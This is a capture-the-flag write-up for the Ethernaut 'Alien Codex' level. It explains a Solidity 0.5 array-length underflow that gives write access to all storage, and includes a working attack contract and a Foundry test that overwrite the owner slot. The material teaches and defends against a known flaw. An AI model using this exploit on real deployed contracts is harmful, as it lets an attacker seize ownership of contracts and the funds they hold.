# Level 19 - Alien Codex

## Objectives

- Claim ownership of `AlienCodex` contract.

## Contract Overview

The `AlienCodex` contract provides a simple and secure way to store and manage a list of bytes32 data on the Ethereum blockchain, with the added security of the `Ownable` contract and the `contacted` modifier ensuring that only authorized parties can interact with the contract.

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/AlienCodex_slither.png)

## Finding the weak spots

The `AlienCodex` contract uses `pragma solidity ^0.5.0;` that is prone to overflow/underflow. That is why when we call `retract()` function it will delete the last element in array but our array `codex` in the begging is empty so it has 0 elements. This will result in do minus 0 so that will be underflow and when decrease 0 by 1 we get -1 so this will underflow and be equal to `2**256 -1`. We will have have `codex` array length of `2**256 -1`. In other words by calling `retract()` function we will have access to all of the state variables inside contract.

## Storage slots

We can see in the `AlienCodex` contract that there's no `owner` variable. This is because it is coming from the inherited `Ownable` contract. If we look into the `Ownable.sol`, we can see that the variable `address private _owner;` is defined in the slot 0 of the contract.

```solidity
contract Ownable {
    address private _owner;
```

In the case of a dynamic array, the reserved slot `p` contains the length of the array as a `uint256`, and the array data itself is located sequentially at the address `keccak256(p)`.
[Source](https://docs.soliditylang.org/en/v0.8.13/internals/layout_in_storage.html#mappings-and-dynamic-arrays)

The storage then looks like this:

```solidity
    address private _owner; // slot 0
    bool public contact; // slot 0
    uint256 codex.length // slot 1
    // ..
    codex[0] // slot keccak(1)
    codex[1] // slot keccak(1) + 1
    codex[2] // slot keccak(1) + 2
    codex[3] // slot keccak(1) + 3
    // ..
    codex[2**256 - 1 - unit(keccack256(1)] // slot 2**256 - 1
    codex[2**256 - 1 - unit(keccack256(1) + 1] // slot 0
```

To access the array at slot 0 and update the value of the `_owner` we have to calculate index i. It can be calculated like:
`uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;`

## Potential attack scenario (hypothesis)

Attacker creates malicious contract with `attack()` function that calls `make_contact()` function than `retract()` function and finally `revise()` function.

## Plan of the attack

1. Attacker creates malicious contract.
2. Attacker calls `make_contact()` function so that the `contact` is set to true. This will allow attacker to go through the `contacted()` modifier.
3. Attacker calls `retract()` function. This will decrease the `codex.length` by 1. He gets an underflow. This will change the `codex.length` to `2**256 -1` which is also the total storage capacity of the contract.
4. Attacker calls `revise()` function to access the array at slot 0 and update the value of the `_owner` with his own address.
5. Attacker claims ownership of `AlienCodex` contract.

## Malicious contract (AlienCodexAttack.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./AlienCodex.sol";

// 1. Attacker creates malicious contract.
contract AlienCodexAttack {
    AlienCodex alienCodexContract;

    constructor(address _alienCodexContract) public {
        alienCodexContract = AlienCodex(_alienCodexContract);
    }

    function attack() external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;

        // 2. Attacker calls `make_contact()` function so that the `contact` is set to true. This will allow attacker to go through the `contacted()` modifier.
        alienCodexContract.make_contact();

        // 3. Attacker calls `retract()` function. This will decrease the `codex.length` by 1. He gets an underflow. This will change the `codex.length` to `2**256 -1` which is also the total storage capacity of the contract.
        alienCodexContract.retract();

        // 4. Attacker calls `revise()` function to access the array at slot 0 and update the value of the `_owner` with his own address.
        // 5. Attacker claims ownership of `AlienCodex` contract.
        alienCodexContract.revise(index, bytes32(uint256(uint160(tx.origin))));
    }
}
```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/19-AlienCodex.t.sol))

```solidity
          emit log_named_address(
            "The original owner of the contract: ",
            alienCodexContract.owner()
        );

        emit log_named_address("Attacker's address: ", address(attacker));

        emit log_string("Starting the exploit...");
        AlienCodexAttack alienCodexAttack = new AlienCodexAttack(
            address(alienCodexContract)
        );
        alienCodexAttack.attack();

        // Test assertion
        assertEq(alienCodexContract.owner(), attacker);
```

## Recommendations

- Use pragma solidity bigger than 0.8.0 because Safemath is by default from 0.8.0
- If you use pragma solidity lower than 0.8.0 you should use Safemath

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Smart Contract Programmer YT - Ethernaut](https://www.youtube.com/playlist?list=PLO5VPQH6OWdWh5ehvlkFX-H3gRObKvSL6)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
